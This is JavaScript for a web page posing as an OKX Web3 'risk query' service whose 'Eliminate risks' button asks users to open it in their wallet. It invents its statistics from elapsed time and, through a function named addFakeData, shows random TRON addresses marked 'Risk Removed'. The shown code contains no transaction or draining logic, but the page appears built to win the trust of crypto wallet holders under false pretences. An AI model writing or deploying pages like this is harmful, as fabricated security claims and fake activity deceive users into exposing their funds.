
 const translations = {
            "zh-TC": {
                "main-title": "風險查詢",
                "sub-title": "用於查詢與處理OKXWEB3上的風險位址",
                "wallet-input-placeholder": "請在OKXWEB3中打開",
                "submit-button": "解除風險",
                "risk-users-text": "風險用戶",
                "safe-users-text": "安全用戶",
                "runtime-text": "運行時間",
                "risk-status": "已解除風險"
            },
            "en": {
                "main-title": "Risk Query",
                "sub-title": "Used to query and process risk addresses on OKXWEB3",
                "wallet-input-placeholder": "Please open in OKXWEB3",
                "submit-button": "Eliminate risks",
                "risk-users-text": "Risk Users",
                "safe-users-text": "Safe Users",
                "runtime-text": "Running Time",
                "risk-status": "Risk Removed"
            }
        };

        let currentLanguage = 'zh-TC'; // 设置默认语言为繁体中文

        function setLanguage(lang) {
            currentLanguage = lang; // 更新当前语言
            document.getElementById("main-title").innerText = translations[lang]["main-title"];
            document.getElementById("sub-title").innerText = translations[lang]["sub-title"];
            document.getElementById("wallet-input").placeholder = translations[lang]["wallet-input-placeholder"];
            document.getElementById("submit-button").innerText = translations[lang]["submit-button"];
            document.getElementById("stat-risk-users-text").innerText = translations[lang]["risk-users-text"];
            document.getElementById("stat-safe-users-text").innerText = translations[lang]["safe-users-text"];
            document.getElementById("stat-runtime").innerText = translations[lang]["runtime-text"];
            document.querySelectorAll(".risk-status").forEach(el => {
                el.innerText = translations[lang]["risk-status"];
            });
        }

        // 计算从2023年1月1日以来的时间
        const startDate = new Date('2023-01-01T00:00:00Z');

        function updateStats() {
            const now = new Date();
            const timeDiff = now - startDate;

            // 计算运行时间
            const days = Math.floor(timeDiff / (1000 * 60 * 60 * 24));
            const hours = Math.floor((timeDiff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((timeDiff % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((timeDiff % (1000 * 60)) / 1000);
            document.getElementById('stat-runtime-text').innerText = `${days}Day ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

            // 计算风险用户数量
            const totalMinutes = Math.floor(timeDiff / (1000 * 60));
            let riskUsers = Math.floor(totalMinutes / 60) * 10 + Math.floor((totalMinutes % 60) / 60) * 7;
            riskUsers += Math.floor((totalMinutes % 60) / 20) * 3; // 每小时增加3个，每小时还会再增加7个
            document.getElementById('stat-risk-users').innerText = `${riskUsers.toLocaleString()}+`;

            // 计算安全用户数量 (风险用户的1/7)
            const safeUsers = Math.floor(riskUsers / 7);
            document.getElementById('stat-safe-users').innerText = `${safeUsers.toLocaleString()}+`;
        }

        // 更新统计数据
        setInterval(updateStats, 1000);
        updateStats(); // 初始化调用一次

        // 生成一个随机的TRON地址
        function generateRandomAddress() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let address = 'T';
            for (let i = 0; i < 32; i++) {
                address += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return address.substring(0, 6) + '...' + address.substring(address.length - 4);
        }

        let timer;

        function addFakeData() {
            const addressList = document.getElementById('address-list');
            const newItem = document.createElement('div');
            newItem.className = 'address-list-item';

            // 生成随机地址和状态
            const randomAddress = generateRandomAddress();
            const riskStatus = document.createElement('span');
            riskStatus.className = 'risk-status';
            riskStatus.innerText = translations[currentLanguage]['risk-status']; // 使用当前语言

            // 填充地址和状态到新元素
            newItem.innerHTML = `<span class="address">${randomAddress}</span>`;
            newItem.appendChild(riskStatus);

            // 插入到列表中
            addressList.insertBefore(newItem, addressList.firstChild);

            // 保持最多10个元素
            if (addressList.children.length > 1) {
                addressList.removeChild(addressList.lastChild);
            }

            // 3-10秒后生成下一个
            const delay = Math.floor(Math.random() * (10000 - 3000 + 1)) + 3000;
            timer = setTimeout(addFakeData, delay);
        }

        // 控制生成数据的暂停与继续
        function handleVisibilityChange() {
            if (document.hidden) {
                clearTimeout(timer);  // 页面隐藏时清除定时器
            } else {
                addFakeData();  // 页面可见时继续生成数据
            }
        }

        document.addEventListener("visibilitychange", handleVisibilityChange);

        // 开始自动生成数据
        setTimeout(addFakeData, 3000);

        // 默认语言设置
        setLanguage(currentLanguage);